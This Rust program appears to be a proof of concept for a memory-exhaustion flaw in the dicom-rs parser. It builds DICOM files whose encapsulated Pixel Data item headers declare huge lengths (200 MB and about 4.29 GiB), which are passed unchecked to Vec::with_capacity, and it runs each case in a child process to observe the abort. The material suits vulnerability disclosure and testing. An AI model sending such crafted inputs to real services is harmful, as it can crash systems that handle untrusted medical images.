use std::io::Cursor;

// Minimal valid File Meta group (Explicit VR Little Endian transfer syntax),
// copied verbatim from `object/src/meta.rs`'s own `TEST_META_1` test fixture.
const META: &[u8] = &[
    b'D', b'I', b'C', b'M',
    0x02, 0x00, 0x00, 0x00, b'U', b'L', 0x04, 0x00, 0xc8, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x01, 0x00, b'O', b'B', 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
    0x02, 0x00, 0x02, 0x00, b'U', b'I', 0x1a, 0x00, 0x31, 0x2e, 0x32, 0x2e, 0x38, 0x34, 0x30,
    0x2e, 0x31, 0x30, 0x30, 0x30, 0x38, 0x2e, 0x35, 0x2e, 0x31, 0x2e, 0x34, 0x2e, 0x31, 0x2e,
    0x31, 0x2e, 0x31, 0x00,
    0x02, 0x00, 0x03, 0x00, b'U', b'I', 0x38, 0x00, 0x31, 0x2e, 0x32, 0x2e, 0x33, 0x2e, 0x34,
    0x2e, 0x35, 0x2e, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x2e, 0x31, 0x32, 0x33,
    0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2e, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x2e, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x2e, 0x31, 0x32, 0x33, 0x34,
    0x35, 0x36, 0x37, 0x00,
    0x02, 0x00, 0x10, 0x00, b'U', b'I', 0x14, 0x00, 0x31, 0x2e, 0x32, 0x2e, 0x38, 0x34, 0x30,
    0x2e, 0x31, 0x30, 0x30, 0x30, 0x38, 0x2e, 0x31, 0x2e, 0x32, 0x2e, 0x31, 0x00,
    0x02, 0x00, 0x12, 0x00, b'U', b'I', 0x14, 0x00, 0x31, 0x2e, 0x32, 0x2e, 0x33, 0x34, 0x35,
    0x2e, 0x36, 0x2e, 0x37, 0x38, 0x39, 0x30, 0x2e, 0x31, 0x2e, 0x32, 0x33, 0x34,
    0x02, 0x00, 0x13, 0x00, b'S', b'H', 0x10, 0x00, 0x52, 0x55, 0x53, 0x54, 0x59, 0x5f, 0x44,
    0x49, 0x43, 0x4f, 0x4d, 0x5f, 0x32, 0x36, 0x39, 0x20,
    0x02, 0x00, 0x16, 0x00, b'A', b'E', 0x00, 0x00,
];

fn pixel_data_header() -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&[0xE0, 0x7F, 0x10, 0x00]); // tag (7FE0,0010)
    v.extend_from_slice(b"OB");
    v.extend_from_slice(&[0x00, 0x00]); // reserved
    v.extend_from_slice(&0xFFFF_FFFFu32.to_le_bytes()); // undefined length
    v
}

fn item_header(len: u32) -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&[0xFE, 0xFF, 0x00, 0xE0]); // tag (FFFE,E000)
    v.extend_from_slice(&len.to_le_bytes());
    v
}

fn build_file(dataset: &[u8]) -> Vec<u8> {
    let mut full = Vec::new();
    full.extend_from_slice(META);
    full.extend_from_slice(dataset);
    full
}

fn run(name: &str, full: Vec<u8>) {
    println!("--- scenario: {name} ({} byte input file) ---", full.len());
    // Real, public, top-level entry point: what a real application calls to
    // parse an untrusted DICOM byte stream (e.g. a file just received over
    // the network or from an upload). No preamble needed for `from_reader`.
    let result = dicom_object::from_reader(Cursor::new(full));
    match result {
        Ok(_) => println!("[{name}] did not abort - parsed successfully (unexpected)"),
        Err(e) => println!("[{name}] did not abort - parser returned a graceful error: {e}"),
    }
}

fn run_scenario(name: &str) {
    match name {
        // First item right after an encapsulated Pixel Data element is
        // always the Basic Offset Table, stored as `Vec<u32>`. Its own
        // declared BYTE length (`len`, attacker-controlled) is passed
        // straight into `Vec::with_capacity(len)` for that `Vec<u32>`,
        // so `len` is misused as an ELEMENT count: the real request is
        // `len * 4` bytes, a 4x amplification of the attacker's own
        // declared length.
        "offset_table" => {
            let huge_item_len: u32 = 200_000_000; // 200,000,000 declared bytes
            let mut dataset = pixel_data_header();
            dataset.extend_from_slice(&item_header(huge_item_len));
            // no actual offset-table bytes follow - EOF right after the header
            run("offset_table", build_file(&dataset));
        }
        // Second item (a plain fragment, not the offset table) is stored as
        // `Vec<u8>`; its own declared length is passed straight into
        // `Vec::with_capacity(len)` before a single byte is read.
        "fragment" => {
            let huge_item_len: u32 = 4_294_967_280; // ~4.29 GiB declared bytes
            let mut dataset = pixel_data_header();
            dataset.extend_from_slice(&item_header(0)); // empty offset table
            dataset.extend_from_slice(&item_header(huge_item_len));
            // no actual fragment bytes follow - EOF right after the header
            run("fragment", build_file(&dataset));
        }
        other => {
            eprintln!("unknown scenario: {other}");
            std::process::exit(2);
        }
    }
}

fn main() {
    // Each scenario is re-run in its own child process: an OOM abort kills
    // the whole process, so running both scenarios in-process would mean
    // the first abort prevents the second scenario from ever executing.
    match std::env::args().nth(1) {
        Some(scenario) => run_scenario(&scenario),
        None => {
            let exe = std::env::current_exe().expect("current exe path");
            for scenario in ["offset_table", "fragment"] {
                println!("=== spawning scenario: {scenario} ===");
                let status = std::process::Command::new(&exe)
                    .arg(scenario)
                    .status()
                    .expect("failed to spawn child process");
                println!("=== scenario {scenario} exited with: {status} ===\n");
            }
        }
    }
}
